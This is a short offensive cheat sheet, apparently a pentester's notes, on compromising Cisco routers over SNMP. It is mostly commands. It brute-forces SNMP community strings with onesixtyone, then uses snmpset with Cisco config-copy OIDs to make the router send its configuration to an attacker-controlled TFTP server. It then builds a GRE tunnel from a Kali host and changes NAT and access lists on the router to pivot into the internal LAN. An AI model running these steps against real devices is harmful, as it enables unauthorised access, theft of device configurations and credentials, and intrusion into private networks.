Cisco SNMP writable Permission 

# Obtaining Cisco configuration over SNMP

To obtain The  configuration File,snmp-community-string Has to be writable permission by default Community String is only Readable. 
Gaining writable String is to enumerate or Brute-forcing.

### SNMP Private String Brute-forcing
```
onesixtyone -i Target.txt -c /usr/share/doc/onesixtyone/dict.txt
```

```
snmpset -c snmp-community-string -v 2c IP Address of Cisco 
snmpset -c Cisco123 -v 2c 192.168.1.100 1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1
snmpset -c Cisco123 -v 2c 192.168.1.100 1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 1
snmpset -c Cisco123 -v 2c 192.168.1.100 1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 4 #Configuration File would be download
snmpset -c Cisco123 -v 2c 192.168.1.100 1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a 192.168.1.99 #TFTP Server
snmpset -c Cisco123 -v 2c 192.168.1.100 1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s test.txt
```


### On Kali 
```
iptunnel add mynet mode gre remote <target external ip> local <attacker external ip> ttl 255
ip addr add 10.11.99.10/24 dev mynet
ifconfig mynet up
route add -net 10.11.99.0 netmask 255.255.255.0 dev mynet
```

### On Cisco
```
enable
configuration terminal 
interface Tunnel
ip address 10.11.99.1 255.255.255.0
ip mtu 1514
ip virtual-reassembly
tunnel source <Interface of WAN on the Cisco>
tunnel destination 10.11.99.10
```
### Access List
```
enable
configure terminal	
interface Tunnel0
ip nat inside          
interface <Internal Lan Interface>
ip nat outside
exit
configure terminal	
access-list client-list permit ip 10.11.99.0 0.0.255.255         
ip nat enable       	 
ip nat source route-map test interface <Internal LAN Interface> overload
ip nat inside source list client-list interface <Internal LAN Interface> overload
```

